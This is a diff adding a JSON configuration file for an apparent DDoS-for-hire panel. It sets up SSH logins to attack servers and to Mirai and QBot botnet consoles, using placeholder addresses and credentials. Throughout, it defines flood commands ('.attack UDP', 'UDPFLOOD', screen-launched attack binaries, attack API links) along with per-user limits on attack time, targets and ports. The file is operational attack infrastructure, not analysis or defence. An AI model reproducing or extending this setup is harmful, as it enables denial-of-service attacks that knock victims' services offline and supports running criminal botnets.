@@ -1,0 +1,372 @@
+{
+    "server_list": [
+        {
+            "enabled": false,
+            "tag": "LAYER 4 #1",
+            "keyboard_interactive": false,
+            "configuration": {
+                "ip": "1.1.1.1",
+                "port": 22,
+                "username": "root",
+                "password": "password"
+            }
+        },
+        {
+            "enabled": true,
+            "tag": "LAYER 7 #1",
+            "keyboard_interactive": false,
+            "configuration": {
+                "ip": "8.8.8.8",
+                "port": 22,
+                "username": "root",
+                "password": "password"
+            }
+        }
+    ],
+    "botnet_list": [
+        {
+            "enabled": true,
+            "tag": "MIRAI",
+            "settings": {
+                "note": "These settings below are executed in order: 'login_word' -> 'initial_enter' -> 'tos_page'",
+                "login_word": {
+                    "enabled": true,
+                    "sleep_in_milliseconds_before": 500,
+                    "word": "botnet"
+                },
+                "initial_enter": {
+                    "enabled": true,
+                    "sleep_in_milliseconds_before": 500
+                },
+                "tos_page": {
+                    "enabled": true,
+                    "sleep_in_milliseconds_before": 500,
+                    "command": "y"
+                },
+                "sleep_in_milliseconds": {
+                    "before_username": 1000,
+                    "before_password": 1000,
+                    "before_command": 1000
+                }
+            },
+            "config": {
+                "host": "8.8.8.8",
+                "port": 22,
+                "username": "username",
+                "password": "password"
+            }
+        },
+        {
+            "enabled": true,
+            "tag": "QBOT",
+            "settings": {
+                "note": "These settings below are executed in this order: 'login_word' -> 'initial_enter' -> 'tos_page'",
+                "login_word": {
+                    "enabled": true,
+                    "sleep_in_milliseconds_before": 500,
+                    "word": "botnet"
+                },
+                "initial_enter": {
+                    "enabled": true,
+                    "sleep_in_milliseconds_before": 500
+                },
+                "tos_page": {
+                    "enabled": true,
+                    "sleep_in_milliseconds_before": 500,
+                    "command": "y"
+                },
+                "sleep_in_milliseconds": {
+                    "before_username": 1000,
+                    "before_password": 1000,
+                    "before_command": 1000
+                }
+            },
+            "config": {
+                "host": "1.1.1.1",
+                "port": 22,
+                "username": "username",
+                "password": "password"
+            }
+        }
+    ],
+    "attacks": [
+        {
+            "method_name": "test3",
+            "api_funnel": {
+                "enabled": false,
+                "links": [
+                    {
+                        "link": "https://cloudflare.com/api/attack?username=&secret=&host={HOST}&port={PORT}&time={TIME}&method=HOME-NTP",
+                        "max_time": 1200,
+                        "enabled": true
+                    },
+                    {
+                        "link": "https://google.com/api/attack?username=&secret=&host={HOST}&port={PORT}&time={TIME}&method=HOME-NTP",
+                        "max_time": 1200,
+                        "enabled": false
+                    }
+                ]
+            },
+            "server_funnel": {
+                "enabled": false,
+                "note": "Only enable one of the two options below. ('all' or 'select')",
+                "all": {
+                    "enabled": true,
+                    "command": "screen -dmS {HOST} ./HOME {HOST} {PORT} {THREADS} {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "servers": [
+                        {
+                            "tag": "LAYER 4 #1",
+                            "command": "screen -dmS {HOST} ./HOME {HOST} {PORT} 10 {TIME}",
+                            "enabled": true
+                        },
+                        {
+                            "tag": "LAYER 4 #2",
+                            "command": "screen -dmS {HOST} ./HOMEV2 {HOST} {PORT} {THREADS} {TIME}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "botnet_funnel": {
+                "enabled": false,
+                "note": "Only enable one of the two options below. ('all' or 'select')",
+                "all": {
+                    "enabled": true,
+                    "command": ".attack UDP {HOST} {PORT} {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "botnets": [
+                        {
+                            "tag": "QBOT",
+                            "command": ".udp {HOST} {TIME} -dport={PORT}",
+                            "enabled": true
+                        },
+                        {
+                            "tag": "MIRAI",
+                            "command": "UDPFLOOD {HOST} {PORT} {TIME}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "port_settings": {
+                        "note": "Only enable one of the two options below. ('method_port_range' or 'method_port_whitelist') (Note: You can have both disabled.)",
+                        "method_port_range": {
+                            "note": "Enabling this will only allow users to attack between the two ports below.",
+                            "min_port": 53,
+                            "max_port": 80,
+                            "enabled": false
+                        },
+                        "method_port_whitelist": {
+                            "note": "Enabling this will only allow users to attack the ports below.",
+                            "ports": [],
+                            "enabled": false
+                        }
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": false,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        },
+        {
+            "method_name": "test4",
+            "api_funnel": {
+                "enabled": false,
+                "links": [
+                    {
+                        "link": "https://cloudflare.com/api/attack?username=&secret=&host={HOST}&port={PORT}&time={TIME}&method=HOME-NTP",
+                        "max_time": 1200,
+                        "enabled": true
+                    },
+                    {
+                        "link": "https://google.com/api/attack?username=&secret=&host={HOST}&port={PORT}&time={TIME}&method=HOME-NTP",
+                        "max_time": 1200,
+                        "enabled": false
+                    }
+                ]
+            },
+            "server_funnel": {
+                "enabled": false,
+                "note": "Only enable one of the two options below. ('all' or 'select')",
+                "all": {
+                    "enabled": true,
+                    "command": "screen -dmS {HOST} ./HOME {HOST} {PORT} {THREADS} {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "servers": [
+                        {
+                            "tag": "LAYER 4 #1",
+                            "command": "screen -dmS {HOST} ./HOME {HOST} {PORT} 10 {TIME}",
+                            "enabled": true
+                        },
+                        {
+                            "tag": "LAYER 4 #2",
+                            "command": "screen -dmS {HOST} ./HOMEV2 {HOST} {PORT} {THREADS} {TIME}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "botnet_funnel": {
+                "enabled": false,
+                "note": "Only enable one of the two options below. ('all' or 'select')",
+                "all": {
+                    "enabled": true,
+                    "command": ".attack UDP {HOST} {PORT} {TIME}"
+                },
+                "select": {
+                    "enabled": false,
+                    "botnets": [
+                        {
+                            "tag": "QBOT",
+                            "command": ".udp {HOST} {TIME} -dport={PORT}",
+                            "enabled": true
+                        },
+                        {
+                            "tag": "MIRAI",
+                            "command": "UDPFLOOD {HOST} {PORT} {TIME}",
+                            "enabled": true
+                        }
+                    ]
+                }
+            },
+            "configuration": {
+                "method_slots": {
+                    "note": "Enabling this will only allow the max number of attacks below to be running with this method.",
+                    "max": 1000,
+                    "enabled": false
+                },
+                "method_min_time": {
+                    "note": "Enabling this will require users to attack for at least the time below.",
+                    "time": 1,
+                    "enabled": false
+                },
+                "method_max_time": {
+                    "note": "Only enable one of the two options below. ('hard' or 'soft') (Note: You can have both disabled.)",
+                    "hard": {
+                        "note": "Enabling this will allow all users to send for the time below for this method regardless of their account max time.",
+                        "time": 86400,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "note": "Enabling this will only allow users with the soft max time bypass role to attack over the time set below.",
+                        "time": 120,
+                        "enabled": false
+                    }
+                }
+            },
+            "method_status": {
+                "method_is_enabled": true,
+                "settings": {
+                    "note": "Only enable one of the two options below. ('cnc_access_only' or 'api_access_only') (Note: You can have both disabled.)",
+                    "cnc_access_only": false,
+                    "api_access_only": false
+                },
+                "restrictions": {
+                    "what_targets_to_allow": {
+                        "note": "Enable at least one of the options below. (Note: You can enable them all.)",
+                        "ip_address": true,
+                        "url": true,
+                        "domain": true,
+                        "subnet": false,
+                        "comma_separated_ip_addresses": false,
+                        "comma_separated_subnets": false
+                    },
+                    "method_group": {
+                        "note": "Enabling 'require_method_group_role' will only allow users with the method group role set in the config.json to attack using this method.",
+                        "method_group_name": "Main Network",
+                        "require_method_group_role": false
+                    },
+                    "port_settings": {
+                        "note": "Only enable one of the two options below. ('method_port_range' or 'method_port_whitelist') (Note: You can have both disabled.)",
+                        "method_port_range": {
+                            "note": "Enabling this will only allow users to attack between the two ports below.",
+                            "min_port": 53,
+                            "max_port": 80,
+                            "enabled": false
+                        },
+                        "method_port_whitelist": {
+                            "note": "Enabling this will only allow users to attack the ports below.",
+                            "ports": [],
+                            "enabled": false
+                        }
+                    },
+                    "as_number_whitelist": {
+                        "note": "Enabling this will override the blacklists that you have set in the config.json file.",
+                        "enabled": false,
+                        "as_number": []
+                    },
+                    "note": "Only enable one of the two options below ('vip' or 'private') (Note: You can have both disabled.)",
+                    "vip": false,
+                    "private": {
+                        "note": "Enabling this will only allow the users below to use this method.",
+                        "enabled": false,
+                        "users": []
+                    }
+                }
+            }
+        }
+    ] 
+}
